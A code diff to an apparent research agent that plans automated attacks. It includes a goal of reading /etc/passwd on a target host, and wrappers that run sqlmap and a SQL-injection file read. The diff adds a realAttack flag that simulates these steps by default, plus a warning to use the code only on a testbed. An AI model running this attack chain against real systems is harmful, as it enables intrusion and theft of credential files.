@@ -4,6 +4,15 @@ import subprocess
 import system2
 system2.traceGoals = True
 
+import dash
+dash.traceUpdate = True
+
+# WARNING: Don't run this on the open internet! In particular 'server3' etc. are bound on my
+# home ISP by a DNS company used by Time Warner Cable, that I don't want to attack!
+# This variable should be 'False' to the attack is simulated, and should only be set to 'True'
+# on a testbed such as DETER.
+realAttack = False
+
 readAgent("""
 
 goalWeight readFile(_server3, '/etc/passwd') 1
@@ -57,6 +66,8 @@ def portScanner(action):
     if not isConstant(host):
         print "Host needs to be bound on calling portScanner:", host
         return False
+    if not realAttack:
+        return [{portVar: "_80", protocolVar: '_http'}] # simulate a web server
     bindingsList = []
     readingPorts = False
     proc = None
@@ -96,6 +107,8 @@ def sqlMap(action):
     # Expect everything to be bound and use sqlmap to check there is a vulnerability there
     # Remove the prefix exclamation marks
     [host, port, base, parameter] = [arg[1:] for arg in action[1:]]
+    if not realAttack:
+        return [{}]    # no bindings, just report finding a vulnerability
     proc = None
     call = ["python", SQLMapHome + "/sqlmap.py", "-u", "http://" + host + ":" + port + "/" + base + "?" + parameter + "=1"]
     try:
@@ -141,6 +154,8 @@ def SQLInjectionReadFile(args):
     print "Performing sql injection attack to read a file with args", args
     [source, target, targetFile, port, baseUrl, parameter] = [arg[1:] for arg in args[1:]]  # assume constants, remove _
     # Call is very similar to sqlMap above with an extra --file-read argument
+    if not realAttack:
+        return [{}]  # simulate success in reading the file (it is stored locally by sqlmap in the real attack)
     result = []
     try:
         call = ["python", SQLMapHome + "/sqlmap.py", "-u",
